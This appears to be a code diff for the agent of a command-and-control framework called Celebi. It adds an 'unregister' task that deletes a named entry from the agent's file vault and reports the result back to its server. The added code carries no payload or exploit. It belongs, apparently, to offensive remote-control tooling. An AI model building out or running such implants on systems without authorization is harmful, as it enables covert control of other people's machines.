@@ -125,6 +125,33 @@ void agent_register(AgentState *state, TaskInfo *task) {
 	free_upload_manager(&upload);
 }
 
+void agent_unregister(AgentState *state, TaskInfo *task) {
+	char *name = task->parameters;
+	
+	BOOL result = remove_from_vault(&state->file_vault, name);
+	
+	#ifdef CELEBI_DEBUG
+	if (result == FALSE) {
+		dprintf("Failed to remove '%s' from vault", name);
+	} else {
+		dprintf("Successfully removed '%s' from vault", name);
+	}
+	#endif
+	
+	TaskPostReply reply = { 0 };
+	if (result == TRUE) {
+		result = perform_post(state, task, &reply, "removed from vault", "success"); 
+	} else {
+		result = perform_post(state, task, &reply, "could not remove from vault", "error: removal failed");
+	}
+	
+	#ifdef CELEBI_DEBUG
+	if (result == TRUE && reply.success == 1) {
+		dprintf("Server acknowledged unregister output.");
+	}
+	#endif
+}
+
 void agent_execute_pico(AgentState *state, TaskInfo *task) {
 	char *name = MSVCRT$strtok(task->parameters, "\t");
 	char *args = MSVCRT$strtok(NULL, "\t");
@@ -183,6 +210,15 @@ void process_task(TaskInfo *task, AgentState *state) {
 		#endif
 		
 		agent_register(state, task);
+		return;
+	}
+	
+	if (MSVCRT$strcmp(task->command, "unregister") == 0) {
+		#ifdef CELEBI_DEBUG
+		dprintf("Received unregister command with parameters: '%s'", task->parameters);
+		#endif
+		
+		agent_unregister(state, task);
 		return;
 	}
 	
